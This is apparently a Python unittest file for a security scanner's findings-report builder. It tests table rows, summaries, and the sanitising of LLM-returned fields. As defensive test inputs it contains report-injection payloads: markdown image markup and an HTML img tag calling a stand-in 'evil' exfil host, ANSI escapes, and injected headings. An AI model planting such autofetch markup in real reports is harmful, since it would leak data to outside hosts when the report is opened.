"""Tests for findings-specific report building."""

import re
import unittest

from core.reporting.findings import (
    build_finding_detail,
    build_findings_rows,
    build_findings_spec,
    build_findings_summary,
    findings_summary,
    findings_summary_line,
)
from core.reporting.renderer import render_report

SAMPLE_FINDINGS = [
    {
        "id": "FIND-0001",
        "file": "src/vuln.c",
        "function": "main",
        "line": 10,
        "vuln_type": "buffer_overflow",
        "cwe_id": "CWE-120",
        "ruling": {"status": "exploitable"},
        "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "cvss_score_estimate": 8.4,
        "severity_assessment": "high",
    },
    {
        "id": "FIND-0002",
        "file": "src/safe.c",
        "line": 20,
        "vuln_type": "buffer_overflow",
        "ruling": {"status": "ruled_out"},
    },
    {
        "finding_id": "FIND-0003",
        "file_path": "./target/cmd.c",
        "start_line": 7,
        "vuln_type": "command_injection",
        "is_true_positive": True,
        "is_exploitable": True,
        "cvss_score_estimate": 9.8,
        "severity_assessment": "critical",
        "cwe_id": "CWE-78",
    },
]


class TestBuildFindingsRows(unittest.TestCase):

    def test_builds_correct_columns(self):
        rows = build_findings_rows(SAMPLE_FINDINGS)
        self.assertEqual(len(rows), 3)
        # Each row is (#, type, cwe, file, status, severity, cvss)
        self.assertEqual(len(rows[0]), 7)

    def test_first_row(self):
        rows = build_findings_rows(SAMPLE_FINDINGS)
        self.assertEqual(rows[0][0], "1")
        self.assertEqual(rows[0][1], "Buffer Overflow")
        self.assertEqual(rows[0][2], "CWE-120")
        self.assertIn("src/vuln.c:10", rows[0][3])
        self.assertEqual(rows[0][4], "Exploitable")
        self.assertEqual(rows[0][5], "High")
        self.assertEqual(rows[0][6], "8.4")

    def test_long_path_truncated(self):
        findings = [{"file_path": "/very/long/path/to/deeply/nested/src/vulnerable_file.c",
                     "start_line": 42, "vuln_type": "xss", "ruling": {"status": "confirmed"}}]
        rows = build_findings_rows(findings)
        self.assertTrue(len(rows[0][3]) <= 40)
        self.assertTrue(rows[0][3].startswith("..."))

    def test_filename_only(self):
        findings = [{"file_path": "/long/path/to/file.c", "start_line": 10,
                     "vuln_type": "xss", "ruling": {"status": "confirmed"}}]
        rows = build_findings_rows(findings, filename_only=True)
        self.assertEqual(rows[0][3], "file.c:10")

    def test_ruled_out(self):
        rows = build_findings_rows(SAMPLE_FINDINGS)
        self.assertEqual(rows[1][4], "Ruled Out")
        self.assertEqual(rows[1][5], "—")  # No severity
        self.assertEqual(rows[1][6], "—")  # No CVSS

    def test_agentic_format(self):
        rows = build_findings_rows(SAMPLE_FINDINGS)
        self.assertEqual(rows[2][4], "Exploitable")
        self.assertEqual(rows[2][2], "CWE-78")


class TestBuildFindingsSummary(unittest.TestCase):

    def test_counts(self):
        counts = build_findings_summary(SAMPLE_FINDINGS)
        self.assertEqual(counts["total"], 3)
        self.assertEqual(counts["exploitable"], 2)
        self.assertEqual(counts["ruled_out"], 1)

    def test_empty(self):
        counts = build_findings_summary([])
        self.assertEqual(counts["total"], 0)


class TestFindingsSummaryLine(unittest.TestCase):

    def test_format(self):
        counts = {"exploitable": 2, "confirmed": 1, "false_positive": 0,
                  "ruled_out": 1, "error": 0, "total": 4}
        line = findings_summary_line(counts)
        self.assertIn("2 Exploitable", line)
        self.assertIn("1 Confirmed", line)
        self.assertIn("1 Ruled Out", line)
        self.assertIn("out of 4", line)


class TestFindingsSummary(unittest.TestCase):

    def test_produces_table_and_counts(self):
        result = findings_summary(SAMPLE_FINDINGS)
        self.assertIn("| # | Type | CWE | File | Status | Severity | CVSS |", result)
        self.assertIn("Buffer Overflow", result)
        self.assertIn("2 Exploitable", result)
        self.assertIn("out of 3", result)


class TestMarkdownRowEscaping(unittest.TestCase):
    """Consistency tests: finding-derived table cells are inert in the
    rendered markdown summary — same escaping policy as the per-finding
    detail table."""

    def test_pipe_in_cells_does_not_add_columns(self):
        findings = [{
            "id": "F-1",
            "file": "src/x|y.c",
            "line": 3,
            "vuln_type": "cmd|injection",
            "cwe_id": "CWE-78|CWE-79",
            "ruling": {"status": "confirmed"},
        }]
        result = findings_summary(findings)
        # 7 columns → exactly 8 unescaped pipes per table line.
        for line in result.splitlines():
            if line.startswith("|"):
                self.assertEqual(len(re.findall(r"(?<!\\)\|", line)), 8, line)

    def test_newline_in_cell_stays_one_row(self):
        findings = [{
            "id": "F-1",
            "file": "a.c\n# fake heading",
            "line": 1,
            "vuln_type": "xss",
            "ruling": {"status": "confirmed"},
        }]
        result = findings_summary(findings)
        self.assertNotIn("# fake heading", result.splitlines())

    def test_console_rows_unescaped(self):
        """The console path shares `build_findings_rows` — it must keep
        raw cells (the console renderer does its own escaping)."""
        findings = [{
            "id": "F-1", "file": "x|y.c", "line": 1,
            "vuln_type": "xss", "ruling": {"status": "confirmed"},
        }]
        rows = build_findings_rows(findings, filename_only=True)
        self.assertIn("x|y.c:1", rows[0][3])


class TestBuildFindingDetail(unittest.TestCase):

    def test_has_title_and_attributes(self):
        section = build_finding_detail(SAMPLE_FINDINGS[0], 1)
        self.assertIn("FIND-0001", section.title)
        self.assertIn("Buffer Overflow", section.title)
        self.assertIn("| Type | Buffer Overflow |", section.content)
        self.assertIn("| CWE | CWE-120 |", section.content)
        self.assertIn("| CVSS | 8.4", section.content)

    def test_reasoning_rendered(self):
        finding = {**SAMPLE_FINDINGS[0], "reasoning": "User input flows to strcpy without bounds check."}
        section = build_finding_detail(finding, 1)
        self.assertIn("**Analysis:**", section.content)
        self.assertIn("User input flows to strcpy", section.content)

    def test_attack_scenario_rendered(self):
        finding = {**SAMPLE_FINDINGS[0], "attack_scenario": "Send 256-byte payload via stdin."}
        section = build_finding_detail(finding, 1)
        self.assertIn("**Attack Scenario:**", section.content)
        self.assertIn("256-byte payload", section.content)

    def test_remediation_rendered(self):
        finding = {**SAMPLE_FINDINGS[0], "remediation": "Replace strcpy with strncpy."}
        section = build_finding_detail(finding, 1)
        self.assertIn("**Remediation:**", section.content)
        self.assertIn("strncpy", section.content)

    def test_function_slot_labeled_function_for_code_finding(self):
        """Code findings (semgrep / codeql / agentic) put a real
        function name in the ``function`` slot — labelled as
        ``Function`` in the report."""
        finding = {**SAMPLE_FINDINGS[0], "function": "process_input",
                   "tool": "semgrep"}
        section = build_finding_detail(finding, 1)
        self.assertIn("| Function | `process_input` |", section.content)

    def test_function_slot_labeled_dependency_for_sca_finding(self):
        """SCA findings stuff the dep name into the ``function`` slot
        because the generic shape requires SOMETHING there and SCA
        doesn't have a code function. Renderer relabels as
        ``Dependency`` so the operator doesn't read it as
        ``urllib3 is a function called urllib3``.

        Discovered 2026-05-21 by a dogfood SCA scan on raptor's
        own repo."""
        finding = {**SAMPLE_FINDINGS[0], "function": "urllib3",
                   "tool": "sca"}
        section = build_finding_detail(finding, 1)
        self.assertIn("| Dependency | `urllib3` |", section.content)
        self.assertNotIn("| Function | `urllib3` |", section.content)

    def test_patch_code_in_code_block(self):
        finding = {**SAMPLE_FINDINGS[0], "patch_code": "strncpy(dst, src, sizeof(dst));"}
        section = build_finding_detail(finding, 1)
        self.assertIn("**Patch:**", section.content)
        self.assertIn("```", section.content)
        self.assertIn("strncpy(dst, src, sizeof(dst));", section.content)

    def test_both_remediation_and_patch_code(self):
        finding = {**SAMPLE_FINDINGS[0],
                   "remediation": "Use bounded copy.",
                   "patch_code": "strncpy(dst, src, n);"}
        section = build_finding_detail(finding, 1)
        self.assertIn("**Remediation:**", section.content)
        self.assertIn("Use bounded copy.", section.content)
        self.assertIn("**Patch:**", section.content)
        self.assertIn("```", section.content)

    def test_pipe_in_code_escaped(self):
        finding = {**SAMPLE_FINDINGS[0], "code": "x = a | b;"}
        section = build_finding_detail(finding, 1)
        self.assertIn("a \\| b", section.content)

    def test_no_extra_sections_when_absent(self):
        section = build_finding_detail(SAMPLE_FINDINGS[1], 2)
        self.assertNotIn("**Analysis:**", section.content)
        self.assertNotIn("**Attack Scenario:**", section.content)
        self.assertNotIn("**Remediation:**", section.content)


class TestFindingDetailSanitisation(unittest.TestCase):
    """Verify LLM-returned fields are sanitised before report rendering."""

    def test_ansi_in_reasoning_escaped(self):
        finding = {**SAMPLE_FINDINGS[0], "reasoning": "vuln\x1b[31m confirmed\x1b[0m"}
        section = build_finding_detail(finding, 1)
        self.assertNotIn("\x1b", section.content)
        self.assertIn("\\x1b", section.content)

    def test_ansi_in_attack_scenario_escaped(self):
        finding = {**SAMPLE_FINDINGS[0], "attack_scenario": "send \x07bell payload"}
        section = build_finding_detail(finding, 1)
        self.assertNotIn("\x07", section.content)

    def test_markdown_heading_in_reasoning_defanged(self):
        finding = {**SAMPLE_FINDINGS[0], "reasoning": "# Injected Heading\nreal analysis"}
        section = build_finding_detail(finding, 1)
        self.assertNotIn("# Injected Heading", section.content)
        self.assertIn("Injected Heading", section.content)

    def test_patch_code_preserves_hash_include(self):
        finding = {**SAMPLE_FINDINGS[0], "patch_code": "#include <stdio.h>\nint main() {}"}
        section = build_finding_detail(finding, 1)
        self.assertIn("#include <stdio.h>", section.content)

    def test_ansi_in_patch_code_escaped(self):
        finding = {**SAMPLE_FINDINGS[0], "patch_code": "int x\x1b[31m = 0;"}
        section = build_finding_detail(finding, 1)
        self.assertNotIn("\x1b", section.content)
        self.assertIn("\\x1b", section.content)

    def test_ansi_in_feasibility_verdict_escaped(self):
        finding = {**SAMPLE_FINDINGS[0],
                   "feasibility": {"verdict": "likely\x1b[32m exploitable"}}
        section = build_finding_detail(finding, 1)
        self.assertNotIn("\x1b", section.content)

    def test_ansi_in_dataflow_summary_escaped(self):
        finding = {**SAMPLE_FINDINGS[0],
                   "dataflow_summary": "src\x1b[31m -> sink"}
        section = build_finding_detail(finding, 1)
        self.assertNotIn("\x1b", section.content)

    def test_long_reasoning_capped(self):
        finding = {**SAMPLE_FINDINGS[0], "reasoning": "x" * 5000}
        section = build_finding_detail(finding, 1)
        self.assertIn("…", section.content)
        self.assertLess(len(section.content), 5000)


class TestBuildFindingsSpec(unittest.TestCase):

    def test_builds_valid_spec(self):
        spec = build_findings_spec(
            SAMPLE_FINDINGS,
            title="Test Report",
            metadata={"Target": "./target"},
        )
        self.assertEqual(spec.title, "Test Report")
        self.assertEqual(len(spec.table_rows), 3)
        self.assertIn("Exploitable", spec.summary)

    def test_renders_to_markdown(self):
        spec = build_findings_spec(SAMPLE_FINDINGS, title="Test Report")
        report = render_report(spec)
        self.assertIn("# Test Report", report)
        self.assertIn("Buffer Overflow", report)
        self.assertIn("CWE-120", report)
        self.assertIn("8.4", report)
        self.assertIn("inherent vulnerability impact", report)

    def test_extra_summary(self):
        spec = build_findings_spec(
            SAMPLE_FINDINGS,
            extra_summary={"Semgrep": 12, "After dedup": 10},
        )
        self.assertIn("Semgrep", spec.summary)
        self.assertEqual(spec.summary["Semgrep"], 12)

    def test_extra_sections(self):
        from core.reporting.spec import ReportSection
        spec = build_findings_spec(
            SAMPLE_FINDINGS,
            extra_sections=[ReportSection("Stage F Review", "No corrections.")],
        )
        self.assertEqual(len(spec.sections), 1)
        self.assertEqual(spec.sections[0].title, "Stage F Review")

    def test_no_details(self):
        spec = build_findings_spec(SAMPLE_FINDINGS, include_details=False)
        self.assertEqual(len(spec.detail_sections), 0)


class TestMdTableCellAutofetch(unittest.TestCase):
    """Report-injection: finding-derived cell values must not render
    autofetch markup (same defense the LLM-output sanitiser applies —
    an `![](url)` in a file path or scanner message otherwise fires
    an exfil request when the report is opened in a browser)."""

    def test_image_markup_stripped(self):
        from core.reporting.findings import _md_table_cell
        out = _md_table_cell("pre ![x](http://evil/exfil?q=1) post")
        self.assertNotIn("![", out)
        self.assertNotIn("http://evil", out)
        self.assertIn("[REDACTED-AUTOFETCH-MARKUP]", out)

    def test_html_img_tag_stripped(self):
        from core.reporting.findings import _md_table_cell
        out = _md_table_cell('<img src="http://evil/x">')
        self.assertNotIn("img", out)
        self.assertNotIn("http://evil", out)

    def test_legitimate_function_signature_survives(self):
        from core.reporting.findings import _md_table_cell
        out = _md_table_cell("check_pw(user, pw) | validate[0]")
        self.assertIn("check_pw(user, pw)", out)
        self.assertIn("\\|", out)

    def test_existing_escapes_unchanged(self):
        from core.reporting.findings import _md_table_cell
        self.assertEqual(_md_table_cell("a|b"), "a\\|b")
        self.assertEqual(_md_table_cell("a`b"), "a\\`b")
        self.assertEqual(_md_table_cell("a\nb"), "a<br>b")


if __name__ == "__main__":
    unittest.main()
